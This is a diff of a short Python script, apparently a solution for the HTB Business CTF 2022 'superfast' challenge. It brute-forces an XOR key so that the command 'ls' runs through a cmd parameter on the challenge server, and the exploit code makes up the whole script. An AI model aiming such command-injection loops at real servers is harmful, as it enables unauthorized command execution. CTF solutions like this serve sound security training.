@@ -1,27 +1,16 @@
 #https://fascinating-confusion.io/posts/2022/07/htb-business-ctf-22-superfast-writeup/
 
-from pwn import *
+import requests
 
-URL = "http://188.166.175.58:32212/index.php?cmd="
-cmd = 'ls'
+url = "http://188.166.175.58:32212/index.php?cmd={}"
 
-def execute_curl(url):
-    try:
-        # Run the cURL command and capture its output
-        result = subprocess.check_output(['curl', url])
-        return result
-    except subprocess.CalledProcessError as e:
-        print("Error executing cURL:", e)
-        return None
+for key in range(1, 256):
+    # Modify the string based on the key (XOR operation)
+    string = ''.join(chr(ord(char) ^ key) for char in "ls")
+    
+    # Send HTTP GET request with the modified string
+    response = requests.get(url.format(string))
+    
+    # Print the response status code and content
+    print(f"Key: {key}, Response: {response.status_code}, Content: {response.text}")
 
-# Call the function with the URL and print the output
-for i in range(1, 256):
-    xor_result =  xor(cmd, i)  
-    final_url = URL + xor_result
-    print("Sending request to:" + final_url)
-
-    output = execute_curl(final_url)
-    if output:
-        print("cURL output:\n"+output)
-
-   
